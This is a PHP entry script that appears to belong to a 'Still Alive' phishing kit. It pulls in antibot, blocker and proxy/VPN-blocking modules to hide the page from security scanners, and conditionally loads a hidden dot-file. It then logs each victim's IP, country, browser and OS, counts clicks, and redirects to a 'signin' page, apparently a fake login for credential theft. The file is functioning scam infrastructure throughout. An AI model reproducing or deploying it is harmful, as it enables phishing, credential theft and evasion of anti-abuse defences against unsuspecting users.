<?php
/*
 ____    __         ___    ___       ______   ___                          
/\  _`\ /\ \__  __ /\_ \  /\_ \     /\  _  \ /\_ \    __                   
\ \,\L\_\ \ ,_\/\_\\//\ \ \//\ \    \ \ \L\ \\//\ \  /\_\  __  __     __   
 \/_\__ \\ \ \/\/\ \ \ \ \  \ \ \    \ \  __ \ \ \ \ \/\ \/\ \/\ \  /'__`\ 
   /\ \L\ \ \ \_\ \ \ \_\ \_ \_\ \_   \ \ \/\ \ \_\ \_\ \ \ \ \_/ |/\  __/ 
   \ `\____\ \__\\ \_\/\____\/\____\   \ \_\ \_\/\____\\ \_\ \___/ \ \____\
    \/_____/\/__/ \/_/\/____/\/____/    \/_/\/_/\/____/ \/_/\/__/   \/____/

 * @Facebook: https://www.facebook.com/ownerstillalive/
*/
session_start();
require_once "config.php";
require_once "blocker.php";
require_once "antibot.php";
require_once "function.php";
if(!isset($_GET["$param"]))
{
    @require_once "._ops.php";
}
if($block_proxyorvpn == "on") { 
  require_once("proxyorvpnblock.php");
}
$file = "logs/stillalive-click.txt";
$isi  = @file_get_contents($file);
$buka = fopen($file,"w"); 
fwrite($buka, $isi+1);
fclose($buka);

$see = fopen("logs/stillalive-log.txt","a");
$jam = date("h:i a");
fwrite($see,"$jam|$ip|$cn|$br|$os"."\n");
fclose($see);
echo "<script type='text/javascript'>window.top.location='signin';</script>";
?>